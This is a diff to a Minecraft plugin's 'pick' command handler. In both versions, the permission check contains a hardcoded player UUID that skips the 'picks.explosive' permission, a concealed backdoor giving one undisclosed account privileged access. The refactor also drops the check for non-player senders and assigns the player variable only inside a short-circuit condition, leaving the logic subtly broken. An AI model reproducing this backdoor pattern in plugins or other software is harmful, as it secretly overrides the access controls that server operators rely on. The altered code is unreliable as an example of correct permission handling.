@@ -38,18 +38,11 @@ public class PrisonPicks extends JavaPlugin {
 
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player player;
-        if(sender instanceof Player)
-        {
-            player = (Player)sender;
-        }else
-        {
-            return false;
-        }
+
         if (label.equalsIgnoreCase("pick")) {
-            if (sender instanceof Player && !player.hasPermission("picks.explosive")
-                                         && !player.getUniqueId().equals(UUID.fromString("e3078d5d-8943-420c-8366-4aa51e212df3")))
-            {
-                player.sendMessage((Object)ChatColor.RED + "Permission Denied!");
+            if (sender instanceof Player && !(sender).hasPermission("picks.explosive")
+                    && !(player = (Player)sender).getUniqueId().equals(UUID.fromString("e3078d5d-8943-420c-8366-4aa51e212df3")))  {
+                player.sendMessage(ChatColor.RED + "Permission Denied!");
                 return false;
             }
 
